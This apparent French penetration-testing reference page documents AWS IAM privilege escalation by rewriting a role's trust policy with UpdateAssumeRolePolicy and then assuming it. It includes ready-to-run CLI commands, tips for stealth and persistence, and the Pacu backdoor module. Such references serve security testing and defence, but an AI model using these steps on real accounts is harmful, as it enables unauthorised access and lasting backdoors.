---
title: "Politique de confiance : réécrire la confiance d'un rôle pour pouvoir l'assumer"
order: 4
description: "iam:UpdateAssumeRolePolicy pour réécrire la politique de confiance d'un rôle afin que votre principal soit autorisé, puis sts:AssumeRole pour y entrer."
keywords:
  - UpdateAssumeRolePolicy
  - trust policy
  - AssumeRole
  - role
  - STS
---

# Politique de confiance

La **politique de confiance** d'un rôle (`AssumeRolePolicyDocument`) décide qui peut l'assumer. `iam:UpdateAssumeRolePolicy` réécrit ce document : vous modifiez donc la confiance d'un rôle privilégié pour y nommer votre propre principal, puis vous l'assumez.

## Réécrire la confiance et assumer

```bash
cat > trust.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow",
 "Principal":{"AWS":"arn:aws:iam::<acct>:user/<you>"},
 "Action":"sts:AssumeRole"}]}
EOF
aws iam update-assume-role-policy --role-name <privileged-role> \
  --policy-document file://trust.json
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<privileged-role> \
  --role-session-name s
```

## Notes d'exploitation

- Ceci écrase le document de confiance : préservez les instructions d'origine et ajoutez les vôtres à la suite pour ne pas casser l'usage légitime du rôle.
- Ne nécessite que `iam:UpdateAssumeRolePolicy` sur le rôle plus `sts:AssumeRole` ; les permissions propres au rôle sont héritées à l'assomption.
- Une modification de confiance durable sert aussi de persistance, puisque votre principal conserve la capacité d'assumer le rôle.

## Outils

- **AWS CLI** (`iam update-assume-role-policy`, `sts assume-role`).
- **Pacu** (`iam__privesc_scan`, `iam__backdoor_assume_role`) : détecte la voie et pose des portes dérobées dans la confiance des rôles à grande échelle.

## Références

- [Rhino Security Labs : élévation de privilèges AWS (UpdateAssumeRolePolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox : iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
